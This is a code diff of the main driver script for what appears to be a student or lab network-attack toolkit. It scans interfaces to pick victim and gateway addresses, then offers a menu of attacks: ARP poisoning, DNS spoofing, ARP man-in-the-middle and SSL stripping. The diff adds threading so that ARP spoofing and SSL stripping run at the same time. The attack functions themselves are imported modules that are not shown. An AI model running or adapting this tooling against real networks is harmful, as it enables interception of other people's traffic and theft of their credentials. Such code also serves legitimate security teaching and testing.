@@ -1,4 +1,3 @@
-import config
 import arp_poison
 import dns_spoof
 import arp_mitm_gateway
@@ -6,16 +5,16 @@ import ssl_strip
 import recon
 import os
 import sys
+import threading
 
 
 def main():
-
+    os.system("clear")
     interfaces = recon.list_interfaces()
 
     interfaceLAN = interfaces[1]
     interfaceNAT = interfaces[2]
 
-    
     ipAttackerLAN = recon.get_own_ip_mac_adress(interfaceLAN)['ipAttacker']
     macAttackerLAN = recon.get_own_ip_mac_adress(interfaceLAN)['macAttacker']
 
@@ -29,57 +28,67 @@ def main():
     ipVictimNAT = devicesListNAT[3]['ip']
     macVictimNAT = devicesListNAT[3]['mac']
 
-
     devicesListLAN = recon.scan_network(interfaceLAN)
     ipVictimLAN = devicesListLAN[0]['ip']
     macVictimLAN = devicesListLAN[0]['mac']
     ipServerLAN = devicesListLAN[1]['ip']
     macServerLAN = devicesListLAN[1]['mac']
 
-
-    # print(recon.scan_network(interfaceNAT))
-    print("Target IP LAN(M1): {}".format(ipVictimLAN))
-    print("Target MAC LAN(M1): {}\n".format(macVictimLAN))
-
-    print("Gateway(Server) LAN IP (M2): {}".format(ipServerLAN))
-    print("Gateway(Server) LAN MAC (M2): {}\n".format(macServerLAN))
-
-    print("Attacker IP (M3) LAN: {}".format(ipAttackerLAN))    
-    print("Attacker MAC (M3) LAN: {}\n".format(macAttackerLAN))
-
-
-    print("Target IP NAT(M1): {}".format(ipVictimNAT))
-    print("Target MAC NAT(M1): {}\n".format(macVictimNAT))
-
-    print("Gateway(Server) NAT IP (M2): {}".format(ipGateway))
-    print("Gateway(Server) NAT MAC (M2): {}\n".format(macGateway))
-
-    print("Attacker IP (M3) NAT: {}".format(ipAttackerNAT))    
-    print("Attacker MAC (M3) NAT: {}\n".format(macAttackerNAT))
-
-
-    if len(sys.argv) != 2:
-        print("Usage: python main.py [arp|dns|ssl]")
-        sys.exit(1)
-    if sys.argv[1] == "arp":
+    print("Please choose an attack:")
+    print("A. ARP Poisoning")
+    print("B. DNS Spoofing")
+    print("C. ARP Listener")
+    print("D. ARP MITM")
+    print("E. SSL Stripping")
+    attack = input("Enter your choice: ")
+    print("\n\n\n")
+    
+    if attack.lower() == "a":
         print("ARP Poisoning...")
         arp_poison.arp_poison(ipVictimLAN, macVictimLAN, ipServerLAN, macAttackerLAN, interfaceLAN)
-    elif sys.argv[1] == "dns":
+    elif attack.lower() == "b":
         print("DNS Spoofing...")
         dns_spoof.dns_spoof()
-    elif sys.argv[1] == "arp_patient":
+    elif attack.lower() == "c":
         arp_poison.arp_listener(macAttackerLAN, interfaceLAN)
-    elif sys.argv[1] == "arp_gateway":
+    elif attack.lower() == "d":
         arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT)
-    if sys.argv[1] == "ssl":
-        print("MITM...")
-        #perform MITM attack using arp_poison.py
+    elif attack.lower() == "e":
+        print("MITM ...")
+        arp_thread = threading.Thread(target=arp_mitm_gateway.spoof, args=(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT))
+        arp_thread.start()
+
         print("SSL Stripping...")
-        ssl_strip.ssl_strip(interfaceNAT)
+        ssl_thread = threading.Thread(target=ssl_strip.ssl_strip, args=(interfaceNAT,))
+        ssl_thread.start()
+
+        arp_thread.join()
+        ssl_thread.join()
 
     else:
-        print("Unknown command: {}. Use either 'arp', 'dns', or 'ssl'".format(sys.argv[1]))
+        print("Unknown command: {}. Use either 'A', 'B', 'C', 'D', or 'E'".format(attack))
         sys.exit(1)
 
 if __name__ == "__main__":
     main()
+
+
+
+
+'''
+print("#######################################")
+# print(recon.scan_network(interfaceNAT))
+print("Target IP LAN(M1): {}".format(ipVictimLAN))
+print("Target MAC LAN(M1): {}\n".format(macVictimLAN))
+print("Gateway(Server) LAN IP (M2): {}".format(ipServerLAN))
+print("Gateway(Server) LAN MAC (M2): {}\n".format(macServerLAN))
+print("Attacker IP (M3) LAN: {}".format(ipAttackerLAN))    
+print("Attacker MAC (M3) LAN: {}\n".format(macAttackerLAN))
+print("Target IP NAT(M1): {}".format(ipVictimNAT))
+print("Target MAC NAT(M1): {}\n".format(macVictimNAT))
+print("Gateway(Server) NAT IP (M2): {}".format(ipGateway))
+print("Gateway(Server) NAT MAC (M2): {}\n".format(macGateway))
+print("Attacker IP (M3) NAT: {}".format(ipAttackerNAT))    
+print("Attacker MAC (M3) NAT: {}\n".format(macAttackerNAT))
+print("#######################################\n\n\n")
+'''
